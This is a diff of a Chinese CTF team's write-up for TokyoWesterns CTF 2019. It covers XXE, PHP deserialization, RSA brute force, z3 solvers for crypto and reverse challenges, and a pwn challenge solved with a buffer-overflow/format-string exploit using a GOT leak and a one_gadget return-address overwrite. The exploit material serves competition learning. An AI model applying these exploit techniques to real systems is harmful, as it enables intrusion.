@@ -15,10 +15,11 @@ https://score.ctf.westerns.tokyo/problems?locale=en
 
 2019/08/31 早上八点 — 2019/09/02 早上八点
 
+
 ---
 # 签到
 
-![upload_8f14f2b3a450b8935b26da424f52fa25](2019 TokyoWesterns CTF 5th 2019.assets/upload_8f14f2b3a450b8935b26da424f52fa25.png)
+![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_8f14f2b3a450b8935b26da424f52fa25.png)
 
 
 
@@ -27,16 +28,15 @@ https://score.ctf.westerns.tokyo/problems?locale=en
 ## j2x2j | open | SOLVED: mote
 
 xxe
-![2](2019 TokyoWesterns CTF 5th 2019.assets/upload_ef5b2b565a32c83fb14bcafbbe6917a1.png)
-![3](2019 TokyoWesterns CTF 5th 2019.assets/upload_c0adfaaa9c1b7128c85ed93ff44d1cec.png)
-
+![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_ef5b2b565a32c83fb14bcafbbe6917a1.png)
+![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_c0adfaaa9c1b7128c85ed93ff44d1cec.png)
 ```
 <?php
 include 'flag.php';
 
 ```
-![](2019 TokyoWesterns CTF 5th 2019.assets/upload_21245d843423e71fade98b74cc984a4d.png)
-![](2019 TokyoWesterns CTF 5th 2019.assets/upload_40dcb1f48a1e18b09937566874a5b2a4.png)
+![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_21245d843423e71fade98b74cc984a4d.png)
+![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_40dcb1f48a1e18b09937566874a5b2a4.png)
 
 
 
@@ -63,13 +63,13 @@ public function getflag() {
 
 
 cookie中的note的值为序列化后base64
-![](2019 TokyoWesterns CTF 5th 2019.assets/upload_7424d381a37cd1cfd3b3b61ec7b22b86.png)
+![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_7424d381a37cd1cfd3b3b61ec7b22b86.png)
 
-![](2019 TokyoWesterns CTF 5th 2019.assets/upload_7cc5623e0f066d9d55ccd68ba3c91066.png)
+![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_7cc5623e0f066d9d55ccd68ba3c91066.png)
 在首页post数据，调用note对象的addnote方法
-![](2019 TokyoWesterns CTF 5th 2019.assets/upload_385d8739e3ab48ef336720c6de83236a.png)
+![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_385d8739e3ab48ef336720c6de83236a.png)
 用array_push，用键值对存放
-![](2019 TokyoWesterns CTF 5th 2019.assets/upload_1211fa38a688f62591ec3a95626e88fc.png)
+![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_1211fa38a688f62591ec3a95626e88fc.png)
 如果校验通过，就进行反序列化，否则$note::isadmin置为false
 
 
@@ -173,7 +173,7 @@ calc.php 是一个流输出接口。前端通过`EventSource`接口与`calc.php`
 
 ## real-baby-rsa | SOLVED | working: yuriXO, mads
 
-直接爆破每个字符。
+题目给了N和e，发现N无法直接分解。观察代码发现加密过程是把flag字符一个一个进行加密。因为一个可见字符Ascii码为32-127，明文空间很小。所以我们就可以直接遍历字符所有可能值，直到找到密文与题目所给密文一致的即为正确明文。代码如下：
 
 ```python
 # flag = 'TWCTF{CENSORED}'
@@ -202,11 +202,13 @@ print(flag)
 
 ## Simple Logic  | SOLVED | working: yuriXO
 
-z3直接干。。。
+ruby语言，flag与密钥经过765轮的模加与异或得到flag密文，但后来又使用多组明文与同一个密钥进行加密，因此可以利用这些数据使用z3求解器求解出密钥，脚本如下。
 
 ```Python
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+
+from z3 import *
 
 flag = 0x43713622de24d04b9c05395bb753d437
 
@@ -239,34 +241,97 @@ def decrypt(msg, key):
     return msg
 
 
-"""
-from z3 import *
 s = Solver()
 key = BitVec('key', 128)
 for p, e in zip(plain, enc):
     s.add(encrypt(p, key) == e)
-if (s.check() == sat):
+if s.check() == sat:
     m = s.model()
-    print(m)
-"""
+    key = m[key].as_long()
+    # key = 62900030173734087782946667685685220617
+    assert decrypt(encrypt(plain[0], key), key) == plain[0]
+    print("TWCTF{{{0}}}".format(hex(decrypt(flag, key))[2:]))
+else:
+    print("unsat")
 
-key = 62900030173734087782946667685685220617
-
-assert decrypt(encrypt(plain[0], key), key) == plain[0]
-
-print("TWCTF{{{0}}}".format(hex(decrypt(flag, key))[2:]))
 ```
 
 # REVERSE
 
 ## easy_crack_me | working | working: ycdxsb, mads
-一些限制：
+从IDA反编译的源码中可以看到一些限制：
 - 长度39
 - "TWCTF{"开头，"}"结尾
-- 中间部分只能为"0123456789abcdef"字符组成，个数分别为
-
 ```
-3+2+2+0+3+2+1+3+3+1+1+3+1+2+2+3
+if ( strlen(a2[1]) != 39 )
+    {
+      puts("incorrect");
+      exit(0);
+    }
+    if ( memcmp(s, "TWCTF{", 6uLL) || s[38] != '}' )
+    {
+      puts("incorrect");
+      exit(0);
+    }
+```
+
+- 中间部分只能为"0123456789abcdef"字符组成，个数分别为`3+2+2+0+3+2+1+3+3+1+1+3+1+2+2+3`
+```
+    v46 = '76543210';
+    v47 = 'fedcba98';
+    for ( i = 0; i <= 15; ++i )
+    {
+      for ( j = strchr(s, *((char *)&v46 + i)); j; j = strchr(j + 1, *((char *)&v46 + i)) )
+        ++*((_DWORD *)&s1 + i);
+    }
+    if ( memcmp(&s1, &unk_400F00, 0x40uLL) )
+    {
+      puts("incorrect");
+      exit(0);
+    }
+```
+进一步通过异或比较等操作对输入字符串进行限制
+```
+    for ( k = 0; k <= 7; ++k )
+    {
+      v10 = 0;
+      v11 = 0;
+      for ( l = 0; l <= 3; ++l )
+      {
+        v5 = s[4 * k + 6 + l];
+        v10 += v5;
+        v11 ^= v5;
+      }
+      *((_DWORD *)&v21 + k) = v10;
+      *((_DWORD *)&v25 + k) = v11;
+    }
+    
+    for ( m = 0; m <= 7; ++m )
+    {
+      v14 = 0;
+      v15 = 0;
+      for ( n = 0; n <= 3; ++n )
+      {
+        v6 = s[8 * n + 6 + m];
+        v14 += v6;
+        v15 ^= v6;
+      }
+      *((_DWORD *)&v29 + m) = v14;
+      *((_DWORD *)&v33 + m) = v15;
+    }
+    if ( memcmp(&v21, &unk_400F40, 0x20uLL) || memcmp(&v25, &unk_400F60, 0x20uLL) )
+    {
+      puts("incorrect");
+      exit(0);
+    }
+    if ( memcmp(&v29, &unk_400FA0, 0x20uLL) || memcmp(&v33, &unk_400F80, 0x20uLL) )
+    {
+      puts("incorrect");
+      exit(0);
+    }
+```
+从.rodata段可以找到对应的数据如下：
+```
 
 400F40:
 0x15E,0xDA,0x12F,0x131,0x100,0x131,0xFB,0x102
@@ -280,9 +345,48 @@ print("TWCTF{{{0}}}".format(hex(decrypt(flag, key))[2:]))
 400FA0:
 0x129,0x103,0x12B,0x131,0x135,0x10B,0xFF,0xFF
 
-128, 128, 255, 128, 255, 255, 255, 255, 128, 255, 255, 128, 128, 255, 255, 128, 255, 255, 128, 255, 128, 128, 255, 255, 255, 255, 128, 255, 255, 255, 128, 255
 ```
+给出了每个字符数值范围的限制如下：
+```
+128, 128, 255, 128, 255, 255, 255, 255, 128, 255, 255, 128, 128, 255, 255, 128, 255, 255, 128, 255, 128, 128, 255, 255, 255, 255, 128, 255, 255, 255, 128, 255
 
+    for ( ii = 0; ii <= 31; ++ii )
+    {
+      v7 = s[ii + 6];
+      if ( v7 <= 47 || v7 > 57 )
+      {
+        if ( v7 <= 96 || v7 > 102 )
+          v45[ii] = 0;
+        else
+          v45[ii] = 128;
+      }
+      else
+      {
+        v45[ii] = 255;
+      }
+    }
+    if ( memcmp(v45, &unk_400FC0, 0x80uLL) )
+    {
+      puts("incorrect");
+      exit(0);
+    }
+```
+最后两个约束分别为求和等于1160以及几个字符的值
+```
+for ( jj = 0; jj <= 15; ++jj )
+      v18 += s[2 * (jj + 3)];
+    if ( v18 != 1160 )
+    {
+      puts("incorrect");
+      exit(0);
+    }
+    if ( s[37] != 53 || s[7] != 102 || s[11] != 56 || s[12] != 55 || s[23] != 50 || s[31] != 52 )
+    {
+      puts("incorrect");
+      exit(0);
+    }
+```
+使用z3进行约束求解，脚本如下
 ```python
 from z3 import *
 f = [BitVec('f%d'%i,8) for i in range(0,39)]
@@ -422,10 +526,52 @@ for fo in sm.found:
 
 # PWN
 
-## one_heap | closed | working: Doctor'yang
+## nothing more to say | closed | working: Doctor'yang
+
+漏洞点在gets函数以及printf函数
+```cmake
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char format; // [rsp+0h] [rbp-100h]
+
+  init_proc(*(_QWORD *)&argc, argv, envp);
+  puts(
+    "Hello CTF Players!\n"
+    "This is a warmup challenge for pwnable.\n"
+    "We provide some hints for beginners spawning a shell to get the flag.\n"
+    "\n"
+    "1. This binary has no SSP (Stack Smash Protection). So you can get control of instruction pointer with stack overflo"
+    "w.\n"
+    "2. NX-bit is disabled. You can run your shellcode easily.\n"
+    "3. PIE (Position Independent Executable) is also disabled. Some memory addresses are fixed by default.\n"
+    "\n"
+    "If you get stuck, we recommend you to search about ROP and x64-shellcode.\n"
+    "Please pwn me :)");
+  gets(&format);
+  printf(&format);
+  return 0;
+}
+```
 
 保护全没开，bof fsb随便搞
+```shell
+[*] '/root/workspace/elf/warmup'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
 ```
+
+调用两次puts泄漏got表地址，libc-database查询libc版本
+```
+~/toolchain/elf/libc-database(master) # ./find puts 9c0 gets 0b0    root@ubuntu
+http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb (id libc6_2.27-3ubuntu1_amd64)
+```
+
+最后one_gadget覆盖返回地址拿shell
+```python
 #! /usr/bin/env python
 # -*- coding: utf-8 -*-
 
@@ -515,6 +661,9 @@ def pwn():
 if __name__ == "__main__":
     pwn()
 ```
+
+`TWCTF{AAAATsumori---Shitureishimashita.}`
+
 
 
 
